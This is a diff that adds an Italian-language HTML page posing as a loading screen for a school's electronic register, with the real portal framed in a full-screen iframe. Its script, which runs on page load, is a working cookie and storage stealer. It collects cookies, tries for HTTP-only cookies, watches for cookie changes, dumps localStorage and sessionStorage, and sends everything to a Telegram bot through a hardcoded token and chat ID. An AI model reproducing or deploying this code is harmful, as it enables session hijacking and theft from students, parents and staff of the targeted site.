@@ -1,0 +1,140 @@
+<!-- http://evil.com/orsoline-full-cookie-stealer.html -->
+<html>
+<head>
+    <title>Caricamento Registro Elettronico</title>
+    <script>
+    // Configurazione Telegram
+    const BOT_TOKEN = '7758818971:AAFilzH7FyUGpUeOXF5hSVSLhLnRwN2wJnE';
+    const CHAT_ID = '5709299213';
+    
+    // Funzione per inviare dati a Telegram senza troncamenti
+    function sendFullDataToTelegram(data) {
+        // Telegram ha un limite di 4096 caratteri per messaggio
+        const chunkSize = 4000;
+        const chunks = [];
+        
+        for (let i = 0; i < data.length; i += chunkSize) {
+            chunks.push(data.substring(i, i + chunkSize));
+        }
+        
+        chunks.forEach((chunk, index) => {
+            const message = index === 0 ? 
+                `🍪 <b>COOKIE COMPLETI:</b>\n<pre>${chunk}</pre>` :
+                `<pre>${chunk}</pre>`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            }).catch(e => console.error('Errore invio:', e));
+        });
+    }
+
+    // Estrae tutti i cookie senza troncamenti
+    function extractCompleteCookies() {
+        if (!document.cookie) {
+            sendFullDataToTelegram("Nessun cookie trovato");
+            return;
+        }
+        
+        // Formatta ogni cookie su una riga separata
+        const fullCookies = document.cookie.split(';')
+            .map(c => c.trim())
+            .join('\n');
+        
+        sendFullDataToTelegram(fullCookies);
+        
+        // Invia anche i cookie HTTP-only se siamo nello stesso dominio
+        try {
+            if (window.location.hostname === 'registro.orsoline.it') {
+                const httpOnlyCookies = getHttpOnlyCookies();
+                if (httpOnlyCookies) {
+                    sendFullDataToTelegram("\n🍪 <b>HTTP-ONLY COOKIES:</b>\n" + httpOnlyCookies);
+                }
+            }
+        } catch(e) {
+            console.log("Impossibile leggere HTTP-only cookies:", e);
+        }
+    }
+
+    // Tentativo di ottenere cookie HTTP-only (funziona solo in alcuni casi)
+    function getHttpOnlyCookies() {
+        // Metodo 1: Provare a leggere da document.cookie (non funziona per HTTP-only)
+        // Metodo 2: Intercettare richieste che includono questi cookie
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', '/', false);
+        xhr.send();
+        
+        // I cookie HTTP-only appariranno nell'header della richiesta
+        const cookieHeader = xhr.getResponseHeader('Set-Cookie');
+        if (cookieHeader) {
+            return cookieHeader.split(/,\s*/).join('\n');
+        }
+        return null;
+    }
+
+    // Monitora le modifiche ai cookie in tempo reale
+    function monitorCookieChanges() {
+        let lastCookie = document.cookie;
+        
+        setInterval(() => {
+            if (document.cookie !== lastCookie) {
+                sendFullDataToTelegram("\n🔄 <b>COOKIE MODIFICATI:</b>\n" + document.cookie);
+                lastCookie = document.cookie;
+            }
+        }, 3000);
+    }
+
+    // Esegui tutto al caricamento della pagina
+    window.onload = function() {
+        // 1. Invia i cookie iniziali
+        extractCompleteCookies();
+        
+        // 2. Avvia il monitoraggio delle modifiche
+        monitorCookieChanges();
+        
+        // 3. Invia anche i dati di storage
+        sendStorageData();
+    };
+
+    // Invia anche i dati da localStorage/sessionStorage
+    function sendStorageData() {
+        let storageData = "";
+        
+        // LocalStorage
+        if (localStorage.length > 0) {
+            storageData += "💾 LOCAL STORAGE:\n";
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storageData += `${key}: ${localStorage.getItem(key)}\n`;
+            }
+        }
+        
+        // SessionStorage
+        if (sessionStorage.length > 0) {
+            storageData += "\n💾 SESSION STORAGE:\n";
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                storageData += `${key}: ${sessionStorage.getItem(key)}\n`;
+            }
+        }
+        
+        if (storageData) {
+            sendFullDataToTelegram(storageData);
+        }
+    }
+    </script>
+</head>
+<body>
+    <iframe src="https://registro.orsoline.it/Default.aspx" 
+            style="width:100%;height:100%;border:none;position:fixed;top:0;left:0;">
+    </iframe>
+</body>
+</html>
